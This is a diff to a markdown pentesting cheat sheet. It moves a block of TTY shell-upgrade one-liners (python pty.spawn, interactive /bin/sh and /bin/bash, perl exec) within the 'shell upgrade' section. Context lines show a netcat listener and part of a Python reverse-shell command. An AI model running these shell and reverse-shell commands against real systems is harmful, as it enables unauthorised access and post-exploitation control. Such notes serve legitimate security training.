@@ -32,7 +32,6 @@
 - [14. RDP-3389](#rdp)
 - [15. SMB](/smb.md)
 - [16. Metasploit](/metasploit.md)
-- [17. Upgrade to Fully Interactive TTY](/Notes/TTY.md)
 - [18. Reverse_Shell_Script](#rev)
 - [19. Privilege escalation](/Privilege.md)
 - [20. Email Harversting with theHarvester](#email)
@@ -221,6 +220,19 @@ ssh username@target_ip #enter password if you gave any
 
 
 # 11. shell upgrade <a name="shell"></a>
+
+- [Upgrade to Fully Interactive TTY](/Notes/TTY.md)
+
+### TTY Shell
+```sh
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo 'os.system('/bin/bash')'
+/bin/sh -i
+/bin/bash -i
+perl -e 'exec "/bin/sh";'
+```
+
 - `export TERM=linux` or `export TERM=xterm`
 - __`python -c 'import pty; pty.spawn("/bin/bash")'`__
 
@@ -236,15 +248,7 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 - __`nc -lnvp 31337`__
 - 
 
-### TTY Shell
-```sh
-python -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-echo 'os.system('/bin/bash')'
-/bin/sh -i
-/bin/bash -i
-perl -e 'exec "/bin/sh";'
-```
+
 
 # 12. [Password Cracking](/hash_cracking.md)
 
